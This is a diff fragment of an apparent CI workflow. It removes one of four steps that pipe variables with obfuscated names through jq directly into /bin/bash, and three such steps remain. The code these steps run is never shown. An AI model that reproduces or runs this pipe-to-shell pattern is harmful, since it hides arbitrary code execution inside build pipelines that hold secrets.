@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$gfnk35" | jq -r .h1571 | /bin/bash
           printf '%s' "$gtl617" | jq -r .ed06374 | /bin/bash
           printf '%s' "$taf84" | jq -r .ql30 | /bin/bash
-          printf '%s' "$iq965" | jq -r .fdoi3002 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
